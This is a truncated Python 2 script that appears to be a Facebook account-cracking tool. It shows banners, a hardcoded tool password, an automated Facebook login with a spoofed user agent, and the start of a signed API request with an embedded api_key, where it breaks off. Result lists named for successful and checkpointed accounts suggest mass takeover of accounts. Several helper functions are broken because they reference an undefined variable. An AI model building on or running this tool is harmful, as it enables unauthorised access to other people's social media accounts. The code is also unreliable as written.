#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Mansoor Khan
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)

#Dev:William Atif
##### LOGO #####
logo = """
 \033[1;97#### ####                                 
/__  ___/       //   / /       //   ) ) 
   / /          //__ / /       //        
  / /          //__  /        //  ____   
 / /          //   \ \       //    / /   
/ /          //     \ \     ((____/ /
\033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;92m๑۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\033[1;97mAuthor©\033[1;97m: \033[1;92mWilliam Atif
\033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/William
\033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/William Atif
\033[1;97mWhatsapp\033[1;97m: \033[1;92m+
\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"""

def tik():
	titik = ['. ','.. ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
       
\033[1;97m  _       __________    __________  __  _________\033[0m
\033[1;97m | |     / / ____/ /   / ____/ __ \/  |/  / ____/\033[0m
\033[1;97m | | /| / / __/ / /   / /   / / / / /|_/ / __/   \033[0m
\033[1;97m | |/ |/ / /___/ /___/ /___/ /_/ / /  / / /___   \033[0m
\033[1;97m |__/|__/_____/_____/\____/\____/_/  /_/_____/\033[3;97mv1.1\033[0m
  \033[1;91m██ 20% *___*
   \033[1;92m███ 40% *___*
    \033[1;93m████ 60% *___* 
      \033[1;97m█████ 80% *___*
       \033[1;96m██████ 100% *___*
\033[1;91m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;93m๑۩۩๑\033[1;91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\033[1;91mAuthor©\033[1;91m: \033[1;93mWilliam Atif
\033[1;91mInstagram\033[1;91m: \033[1;93mhttps://www.Instagram.com/William Atif
\033[1;91mFacebook\033[1;91m: \033[1;93mhttps://www.facebook.com/William  Atif
\033[1;91mWhatsapp\033[1;91m: \033[1;93m+
\033[1;91m«--------------------\033[1;93m✧\033[1;91m--------------------»"""
jalan('              \033[1;91mREAD CAREFULLY:')
jalan("\033[1;97m Tool Username And Password  ")
jalan('\033[1;97m    Username William Password Atif ')
jalan("\033[1;97m    ██████ 100%  ")

print "\033[1;91m«-------------\033[1;93mLogin With Tool\033[1;91m-------------»"

CorrectUsername = "William"
CorrectPassword = "Atif"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m🔐 \x1b[1;91mTool Username \x1b[1;91m»» \x1b[1;93m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m🔐 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;93m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:fack.user0
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://www.Facebook.com/')
    else:
        print "\033[1;91mWrong Username"
        os.system('xdg-open https://www.Facebook.com/fack.user0')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		jalan(' \033[1;91mWarning: \033[1;97mDo Not Use Your Personal Account' )
		jalan('          \033[1;97mUse a New Account To Login' )
		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
		print('	   \033[1;95m【\x1b[1;95mLOGIN WITH FACEBOOK\x1b[1;95m】' )
		print('	' )
		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email\x1b[1;93m: \x1b[1;96m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;93m: \x1b[1;96m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97
